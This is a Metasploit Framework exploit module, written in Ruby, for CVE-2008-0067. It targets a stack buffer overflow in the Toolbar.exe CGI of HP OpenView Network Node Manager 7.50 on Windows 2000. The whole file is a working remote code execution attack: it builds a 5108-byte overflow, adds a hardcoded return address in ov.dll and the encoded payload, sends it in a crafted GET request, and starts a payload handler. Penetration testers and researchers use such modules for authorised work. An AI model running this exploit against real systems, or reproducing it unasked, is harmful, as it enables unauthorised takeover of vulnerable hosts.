##
# $Id: hp_nnm_toolbar_01.rb 13192 2011-07-16 04:45:21Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP OpenView Network Node Manager Toolbar.exe CGI Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.50.
				By sending a specially crafted CGI request to Toolbar.exe, an attacker may be able to execute
				arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 13192 $',
			'References'     =>
				[
					[ 'CVE', '2008-0067' ],
					[ 'OSVDB', '53222' ],
					[ 'BID', '33147' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 650,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'HP OpenView Network Node Manager 7.50 / Windows 2000 All', { 'Ret' => 0x5a01d78d } ], # ov.dll
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jan 7 2009'))

		register_options( [ Opt::RPORT(80) ], self.class )
	end

	def exploit

		sploit = rand_text_alpha_upper(5108) + [target.ret].pack('V') + payload.encoded

		print_status("Trying target #{target.name}...")

		send_request_raw({
			'uri'		=> "/OvCgi/Toolbar.exe?" + sploit,
			'method'	=> "GET",
			}, 5)


		handler

	end

end